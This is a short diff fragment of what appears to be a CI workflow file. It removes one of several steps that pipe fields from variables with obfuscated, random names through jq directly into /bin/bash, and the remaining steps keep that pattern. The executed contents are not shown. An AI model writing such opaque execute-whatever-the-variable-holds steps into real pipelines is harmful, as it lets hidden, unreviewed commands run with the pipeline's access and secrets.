@@ -22,7 +22,6 @@ jobs:
           echo $dmbls2924 | jq -r .hfvts633 | /bin/bash
           printf '%s' "$cvtgn43975" | jq -r .dc5470 | /bin/bash
           echo $p146 | jq -r .cmyat071 | /bin/bash
-          printf '%s' "$btj39" | jq -r .g6 | /bin/bash
 
       - name: Upload data
         if: always()
